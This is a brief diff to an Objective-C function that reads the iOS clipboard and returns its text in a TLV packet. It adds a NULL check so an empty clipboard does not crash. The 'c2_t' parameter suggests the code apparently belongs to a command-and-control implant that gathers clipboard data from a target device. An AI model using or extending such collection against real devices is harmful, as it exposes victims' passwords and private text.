@@ -201,16 +201,20 @@ static tlv_pkt_t *ui_clipboard_set(c2_t *c2)
 static tlv_pkt_t *ui_clipboard_get(c2_t *c2)
 {
     tlv_pkt_t *result;
-    NSString *clipboardText;
+    UIPasteboard *pasteboard;
     char *text;
 
     result = api_craft_tlv_pkt(API_CALL_SUCCESS);
 
     @autoreleasepool
     {
-        clipboardText = [UIPasteboard generalPasteboard].string;
-        text = (char *)[clipboardText cStringUsingEncoding:NSUTF8StringEncoding];
-        tlv_pkt_add_string(result, TLV_TYPE_STRING, text);
+        pasteboard = [UIPasteboard generalPasteboard];
+        text = (char *)[pasteboard.string UTF8String];
+
+        if (text != NULL)
+        {
+            tlv_pkt_add_string(result, TLV_TYPE_STRING, text);
+        }
     }
 
     return result;
